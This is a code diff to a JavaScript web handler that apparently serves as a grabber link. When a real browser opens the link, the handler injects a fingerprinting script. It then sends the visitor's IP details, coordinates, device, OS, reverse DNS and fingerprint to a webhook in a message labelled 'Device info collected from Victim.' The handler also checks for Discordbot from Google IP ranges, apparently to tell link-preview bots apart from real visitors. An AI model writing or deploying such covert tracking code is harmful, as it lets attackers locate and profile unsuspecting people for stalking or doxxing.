@@ -218,10 +218,7 @@ export default async function handler(req, res) {
         // Call in the handler function:
         logDebugInfo(reverseDNS, requestMetadata);
 
-        // In the handler function, add this for browser requests:
-        if (req.method === 'GET' && (deviceType === 'Desktop' || deviceType === 'Mobile' || deviceType === 'Tablet')) {
-            injectFingerprintScript(res);
-        }
+
 
         // Check 1: Google LLC and Discordbot
         if (ipDetails.isp === "Google LLC" && userAgent.includes("Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)")) {
@@ -345,43 +342,46 @@ export default async function handler(req, res) {
             console.log("Preparing to send the default message with full info...");
 
             try {
-                // Simulate or collect fingerprint data
-                const fingerprint = await getFingerprintData();
 
-                const fields = createCommonFields(
-                    ipDetails,
-                    coords,
-                    userAgent,
-                    deviceType,
-                    os,
-                    browserEngine,
-                    acceptLanguage,
-                    acceptEncoding,
-                    doNotTrack,
-                    referer,
-                    reverseDNS,
-                    requestMetadata,
-                    fingerprint
-                );
+                // In the handler function, add this for browser requests:
+                if (req.method === 'GET' && (deviceType === 'Desktop' || deviceType === 'Mobile' || deviceType === 'Tablet')) {
+                    const fingerprint = await injectFingerprintScript(res);
+                    const fields = createCommonFields(
+                        ipDetails,
+                        coords,
+                        userAgent,
+                        deviceType,
+                        os,
+                        browserEngine,
+                        acceptLanguage,
+                        acceptEncoding,
+                        doNotTrack,
+                        referer,
+                        reverseDNS,
+                        requestMetadata,
+                        fingerprint
+                    );
 
-                console.log("Fields for webhook message created successfully:", fields);
+                    console.log("Fields for webhook message created successfully:", fields);
 
-                const message = {
-                    embeds: [
-                        {
-                            title: "User Opened Link",
-                            color: 0x00FFFF,
-                            description: "Device info collected from Victim.",
-                            fields: fields
-                        }
-                    ]
-                };
+                    const message = {
+                        embeds: [
+                            {
+                                title: "User Opened Link",
+                                color: 0x00FFFF,
+                                description: "Device info collected from Victim.",
+                                fields: fields
+                            }
+                        ]
+                    };
 
-                console.log("Webhook message prepared:", JSON.stringify(message, null, 2));
+                    console.log("Webhook message prepared:", JSON.stringify(message, null, 2));
 
-                await sendToWebhook(message);
+                    await sendToWebhook(message);
 
-                console.log("Default webhook message sent successfully.");
+                    console.log("Default webhook message sent successfully.");
+                }
+
             } catch (error) {
                 console.error("An error occurred while sending the default webhook message:", error);
             }
